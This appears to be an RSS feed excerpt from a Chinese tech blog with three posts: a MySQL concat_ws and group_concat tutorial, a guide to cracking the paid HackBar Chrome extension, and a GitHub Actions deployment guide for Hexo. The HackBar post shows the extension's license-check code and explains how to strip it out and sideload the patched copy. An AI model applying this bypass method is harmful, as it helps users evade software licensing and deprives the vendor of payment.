<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+-------------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+-------------------------------+
<span class="p">|</span> 11,22,33 <span class="p">|</span>
+-------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="和mysql中concat函数不同的是-concat_ws函数在执行的时候不会因为null值而返回null">和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span><span class="p">;</span>
+-------------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span> <span class="p">|</span>
+-------------------------------+
<span class="p">|</span> 11,22 <span class="p">|</span>
+-------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="group_concat-函数">GROUP_CONCAT() 函数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">group_concat</span><span class="p">([</span><span class="k">DISTINCT</span><span class="p">]</span> <span class="err">要连接的字段</span> <span class="p">[</span><span class="k">Order</span> <span class="k">BY</span> <span class="k">ASC</span><span class="o">/</span><span class="k">DESC</span> <span class="err">排序字段</span><span class="p">]</span> <span class="p">[</span><span class="n">Separator</span> <span class="err">‘分隔符’</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="基本查询">基本查询</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> * from aa<span class="p">;</span>
+------+------+
<span class="p">|</span> id<span class="p">|</span> name <span class="p">|</span>
+------+------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10<span class="p">|</span>
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">200</span>   <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">500</span>   <span class="p">|</span>
+------+------+
<span class="m">6</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把name字段的值打印在一行逗号分隔默认">以id分组，把name字段的值打印在一行，逗号分隔(默认)</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+--------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name<span class="o">)</span> <span class="p">|</span>
+------+--------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20,20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span> <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500<span class="p">|</span>
+------+--------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把去冗余的name字段的值打印在一行逗号分隔">以id分组，把去冗余的name字段的值打印在一行，逗号分隔</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>distinct name<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+-----------------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>distinct name<span class="o">)</span> <span class="p">|</span>
+------+-----------------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span>   <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500 <span class="p">|</span>
+------+-----------------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把name字段的值打印在一行逗号分隔以name排倒序">以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+---------------------------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> <span class="p">|</span>
+------+---------------------------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20,20,10   <span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 500,200<span class="p">|</span>
+------+---------------------------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="区别">区别</h2>
<p><a href="https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws">https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws</a></p>
<h3 id="concat_ws">concat_ws</h3>
<p><a href="http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php">http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php</a></p>
<p></p>
<h3 id="group_concat">group_concat</h3>
<p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p>
<p></p>
]]></description></item><item><title>HackBar破解</title><link>https://lgf.im/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0000</pubDate><author/><guid>https://lgf.im/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p>
<p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
<p></p>
<p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p>
<p>未破解前的hackbar是这样的，按钮没法用，显示一个红框</p>
<p></p>
<p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p>
<h2 id="破解插件">破解插件</h2>
<h3 id="找到插件路径">找到插件路径</h3>
<p>首先我们需要在官网上找到插件的安装地址并进行安装</p>
<p></p>
<p>安装后插件会存放在我们电脑的本地</p>
<p>在chrome中打开 <a href="chrome://version/" target="_blank" rel="noopener noreffer">version</a> 页面，可以在 <code>个人资料路径</code> 位置找到Chrome浏览器数据的存放位置</p>
<p></p>
<p>我们在文件管理器中打开这个路径，找到里面的<code>Extension</code>目录，这个目录里面就存放了我们的所有扩展插件</p>
<p></p>
<p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p>
<h3 id="分析授权验证">分析授权验证</h3>
<p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// 授权验证失败
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">message</span><span class="o">=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 将hidden属性移除，就会显示输入证书的红框
</span><span class="c1"></span>    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license&#39;</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;hidden&#39;</span><span class="p">);</span>
    <span class="c1">// 如果有消息，就在证书那个红框显示出来
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">message</span><span class="p">){</span>
        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license span&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// 标记证书无效
</span><span class="c1"></span>    <span class="nx">license_ok</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// 从chrome本地存储中获取都license内容
</span><span class="c1"></span><span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">([</span><span class="s1">&#39;license&#39;</span><span class="p">],</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">license</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">license</span><span class="p">;</span>
    <span class="c1">// 如果证书内容存在
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">license</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//通过链接谷歌服务器检查网络情况
</span><span class="c1"></span>        <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://google.com&#34;</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 从证书服务器检查证书
</span><span class="c1"></span>                <span class="nx">fetch</span><span class="p">(</span><span class="nx">license_server</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nx">license</span><span class="p">)</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
                    <span class="p">})</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// 无效的证书会返回
</span><span class="c1"></span>                        <span class="c1">// {&#34;pong&#34;:false,&#34;message&#34;:&#34;License is invalid&#34;}
</span><span class="c1"></span>                        <span class="kr">const</span> <span class="nx">pong</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">pong</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">pong</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                            <span class="c1">// 证书无效，调用函数显示红框并使功能不可用
</span><span class="c1"></span>                            <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
                        <span class="c1">// 授权服务器连接不上
</span><span class="c1"></span>                        <span class="nx">disable_hackbar</span><span class="p">();</span>
                    <span class="p">});</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
            <span class="p">});</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// 证书不存在，直接禁用插件
</span><span class="c1"></span>        <span class="nx">disable_hackbar</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="p">........</span>
<span class="c1">// 证书检查函数
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">check_license</span><span class="p">(){</span>
    <span class="c1">// 检查 license_ok 标记
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">license_ok</span><span class="p">){</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Please input valid license!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="进行破解">进行破解</h3>
<p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p>
<ul>
<li><code>license_ok</code> 一开始是 <code>true</code></li>
<li>证书检查失败的红框一开始是隐藏的</li>
<li>授权验证失败调用的是 <code>disable_hackbar()</code> 函数</li>
<li>只在一处地方会向 服务器 检查证书状况</li>
<li>其他地方都是通过 <code>check_license()</code> 也就是 <code>license_ok</code> 标记检查授权的</li>
</ul>
<p>也就是说，一共有两个关键点：</p>
<ol>
<li>证书检查失败的红框</li>
<li>功能的正常使用</li>
</ol>
<p>针对证书检查失败的红框，只需要 <code>disable_hackbar</code> 函数不运行 或者 里面去除<code>hidden</code>标记的代码不运行，就不会显示红框了</p>
<p>针对功能的正常使用，有很多办法可以达到：</p>
<ol>
<li>首先我们知道，这些功能都是在调用 <code>check_license()</code> 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉</li>
<li>我们还发现， <code>check_license()</code> 函数是通过 <code>license_ok</code> 标记检查授权的，所以我们可以在检查前将 <code>license_ok</code> 标记为 <code>true</code>，或者说将前面标记 <code>license_ok = false</code> 的代码注释掉</li>
</ol>
<p>最后我们发现，红框一开始是不显示的，<code>license_ok</code>一开始是<code>true</code>的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、<code>license_ok</code>为<code>false</code>，所以那段代码直接删除了就ok了</p>
<blockquote>
<p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p>
</blockquote>
<h2 id="插件安装">插件安装</h2>
<p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p>
<p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p>
<p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p>
<p>左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了</p>
<p></p>
<p>通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用</p>
<blockquote>
<p>当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布
这样所有人都可以安装了，当然推荐是 <strong>不公开</strong> 的发布模式</p>
</blockquote>
<p>安装后，按F12，插件就可以正常使用了</p>
<p></p>
<h2 id="总结">总结</h2>
<p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
]]></description></item><item><title>使用Github Actions对Hexo博客自动部署</title><link>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</link><pubDate>Sat, 21 Mar 2020 09:24:56 +0000</pubDate><author/><guid>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 <code>hexo g</code> 生成静态网页，然后 <code>hexo d</code> 将public目录推送到github、coding、gitee等平台。</p>
<p>但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。</p>
<h2 id="操作">操作</h2>
<h3 id="开启actions功能">开启actions功能</h3>
<p>在我们博客的github仓库顶部可以找到 Actions 菜单，在里面我们可以搜索、选择各种预备好的actions模板，也可以点击 <code>Set up a workflow yourself</code> 按钮创建自己的工作流。</p>
<p></p>
<p>这里我的部署工作稍微复杂点，所以选择自己编写工作流配置文件。</p>
<p>在手动编写面板的右侧可以搜索别人写好的各种actions，方便我们使用这些actions配置一些基本的工作</p>
<p></p>
<p>当然，也可以选择在 hexo 根目录下创建 <code>.github/workflows</code> 目录，并在里面编写github actions配置文件的方法来开启这个功能。</p>
<h3 id="基本部署">基本部署</h3>
<p>首先我们需要将git库的代码检出到github actions提供的容器中，这里使用github提供的checkout步骤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@master</span><span class="w">
</span><span class="w">  </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>因为hexo需要依赖node.js环境，所以我们还要安装node环境</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/setup-node@master</span><span class="w">
</span><span class="w">  </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">node-version</span><span class="p">:</span><span class="w"> </span><span class="m">12.</span><span class="l">x</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>有了node环境后我们需要安装各种依赖包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Installation</span><span class="w">
</span><span class="w">  </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="sd">|
</span><span class="sd">    npm install
</span><span class="sd">    npm install -g hexo-cli
</span></code></pre></td></tr></table>
</div>
</div><p>依赖装好后就可以执行命令生成静态网站了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Generate</span><span class="w">
</span><span class="w">  </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l">hexo clean &amp;&amp; hexo g</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>最后一步就是将生成的public目录推到github仓库的page分支上，这样github pages就会将最新的网站自动部署了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml">- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Deploy</span><span class="w">
</span><span class="w">  </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-gh-pages@v3</span><span class="w">
</span><span class="w">  </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">github_token</span><span class="p">:</span><span class="w"> </span><span class="l">${{ secrets.GITHUB_TOKEN }}</span><span class="w">
</span><span class="w">    </span><span class="nt">publish_dir</span><span class="p">:</span><span class="w"> </span><span class="l">./public</span><span class="w">
</span><span class="w">    </span><span class="nt">cname</span><span class="p">:</span><span class="w"> </span><span class="l">g.blog.lgf.im</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><h3 id="增加更多功能">增加更多功能</h3>
<p>在github actions工作流中，还可以完成更多更复杂的操作，里面可以直接执行shell脚本，可以使用docker镜像提供的特殊环境，大家可以根据自己需求进行修改。</p>
<h2 id="完整配置文件">完整配置文件</h2>
<p>我的配置文件是适合我自己博客用的，里面还包括了网页、js、css、图片的压缩，cdn链接的替换，自动打release方便绕过jsDelivr的缓存。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yml" data-lang="yml"><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Hexo CICD</span><span class="w">
</span><span class="w"></span><span class="nt">on</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">push</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="l">master</span><span class="w">
</span><span class="w"></span><span class="nt">jobs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hexo build &amp; deploy</span><span class="w">
</span><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu-18.04</span><span class="w">
</span><span class="w">    </span><span class="nt">steps</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@master</span><span class="w">
</span><span class="w">      </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">    </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/setup-node@master</span><span class="w">
</span><span class="w">      </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">node-version</span><span class="p">:</span><span class="w"> </span><span class="m">12.</span><span class="l">x  </span><span class="w">
</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">replace cdn url</span><span class="w">
</span><span class="w">      </span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l">replace</span><span class="w">
</span><span class="w">      </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="sd">|
</span><span class="sd">        tagname=$(date +%y%j%H%M)
</span><span class="sd">        sed -i &#34;s/hexoblog/hexoblog@$tagname/g&#34; _config.yml
</span><span class="sd">        sed -i &#34;s/hexoblog/hexoblog@$tagname/g&#34; themes/cactus/_config.yml
</span><span class="sd">        echo &#34;::set-output name=tagname::$tagname&#34;
</span><span class="sd">    - name: Installation
</span><span class="sd">      run: |
</span><span class="sd">        npm install
</span><span class="sd">        npm install -g hexo-cli gulp
</span><span class="sd">    - name: Generate
</span><span class="sd">      run: hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d
</span><span class="sd">    - name: Deploy
</span><span class="sd">      uses: peaceiris/actions-gh-pages@v3
</span><span class="sd">      with:
</span><span class="sd">        github_token: ${{ secrets.GITHUB_TOKEN }}
</span><span class="sd">        publish_dir: ./public
</span><span class="sd">        cname: g.blog.lgf.im
</span><span class="sd">    - name: Create Release
</span><span class="sd">      uses: actions/create-release@latest
</span><span class="sd">      env:
</span><span class="sd">        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
</span><span class="sd">      with:
</span><span class="sd">        tag_name: ${{ steps.replace.outputs.tagname }}
</span><span class="sd">        release_name: ${{ steps.replace.outputs.tagname }}
</span><span class="sd">        body: Automatic generated
</span><span class="sd">        draft: false
</span><span class="sd">        prerelease: true
</span></code></pre></td></tr></table>
</div>
</div><blockquote>
